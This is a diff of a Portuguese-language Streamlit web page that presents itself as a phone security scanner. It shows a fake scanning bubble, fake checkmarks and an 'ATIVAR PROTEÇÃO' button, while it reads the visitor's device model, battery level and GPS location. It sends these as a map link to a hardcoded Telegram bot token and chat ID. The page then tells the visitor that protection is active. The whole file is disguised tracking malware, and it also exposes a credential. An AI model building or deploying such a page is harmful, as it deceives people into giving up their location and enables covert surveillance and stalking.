@@ -3,7 +3,7 @@ import requests
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# 1. CONFIGURAÇÕES (TELEGRAM)
+# 1. SETUP TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
@@ -14,59 +14,83 @@ def enviar_telegram(msg):
 
 st.set_page_config(page_title="Segurança", layout="centered")
 
-# 2. CAPTURA AUTOMÁTICA (DISPOSITIVO E BATERIA)
-# Captura o modelo e a bateria assim que a página carrega
-modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_MODEL')
-bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BATTERY_LEVEL')
+# 2. ESTILO DA BOLHA (RESTAURADO)
+st.markdown("""
+    <style>
+    .main { background-color: #000; color: white; }
+    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
+    .circle {
+        width: 180px; height: 180px; border-radius: 50%;
+        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
+        border: 2px solid rgba(46, 204, 113, 0.5);
+        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
+        display: flex; align-items: center; justify-content: center;
+        animation: pulse 2s infinite ease-in-out;
+    }
+    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+    .pct-text { font-size: 45px; font-weight: bold; color: white; }
+    div.stButton > button {
+        background-color: #ffc107 !important; color: black !important;
+        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
+    }
+    </style>
+""", unsafe_allow_html=True)
 
-# 3. INTERFACE VISUAL
+# 3. CAPTURA DE DADOS
+modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE')
+bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')
+loc = get_geolocation() # Captura limpa sem key para evitar TypeError
+
+# 4. INTERFACE
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
+caixa_bolha = st.empty()
 
-# Mantém o estado do clique
-if 'btn_clicado' not in st.session_state:
-    st.session_state['btn_clicado'] = False
+if 'ativo' not in st.session_state:
+    st.session_state['ativo'] = False
 
-# Mostra a esfera de progresso
-caixa_status = st.empty()
-if not st.session_state['btn_clicado']:
-    caixa_status.markdown('<h1 style="text-align:center; font-size:100px;">4%</h1>', unsafe_allow_html=True)
+# Mostra a bolha em 4% ou modo de espera
+if not st.session_state['ativo']:
+    with caixa_bolha.container():
+        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 else:
-    caixa_status.markdown('<h1 style="text-align:center; font-size:60px;">Wait...</h1>', unsafe_allow_html=True)
+    with caixa_bolha.container():
+        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">...</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. O BOTÃO DE CLIQUE ÚNICO
+# 5. LÓGICA DE 1 CLIQUE (SEM ERRO NA LINHA 51)
 if st.button("🔴 ATIVAR PROTEÇÃO"):
-    st.session_state['btn_clicado'] = True
+    st.session_state['ativo'] = True
 
-# 5. LÓGICA DE CAPTURA APÓS O CLIQUE
-if st.session_state['btn_clicado']:
-    # Chama o GPS (O navegador vai pedir a permissão aqui)
-    loc = get_geolocation() 
-    
-    if loc:
-        # Se pegou a localização, envia tudo
+if st.session_state['ativo']:
+    # CORREÇÃO DA LINHA 51: Só entra se 'coords' existir no dicionário
+    if loc and 'coords' in loc:
+        # Animação da bolha subindo
+        for p in [20, 55, 85, 100]:
+            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+            time.sleep(0.1)
+        
         lat = loc['coords']['latitude']
         lon = loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
         relatorio = (
-            f"🛡️ PROTEÇÃO ATIVADA\n\n"
-            f"📱 Modelo: {modelo[:60] if modelo else 'Não capturado'}\n"
+            f"🛡️ SISTEMA ATIVADO\n\n"
+            f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
             f"🔋 Bateria: {bateria if bateria else '--'}%\n"
-            f"📍 [LOCALIZAÇÃO NO MAPA]({mapa})"
+            f"📍 [LOCALIZAÇÃO]({mapa})"
         )
         
         enviar_telegram(relatorio)
-        st.success("✅ Proteção Ativada com Sucesso!")
-        st.session_state['btn_clicado'] = False
+        st.success("✅ Proteção Ativada!")
+        st.session_state['ativo'] = False
         st.stop()
     else:
-        # Enquanto não aceitar a localização, ele fica nesta tela
-        st.warning("⚠️ Aceite a permissão de localização no navegador para concluir...")
-        time.sleep(2)
+        # Caso o GPS ainda não tenha sido autorizado
+        st.warning("⚠️ Aguardando permissão do GPS...")
+        time.sleep(1)
         st.rerun()
 
-st.markdown('<p style="text-align:center; color:#555; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
+st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
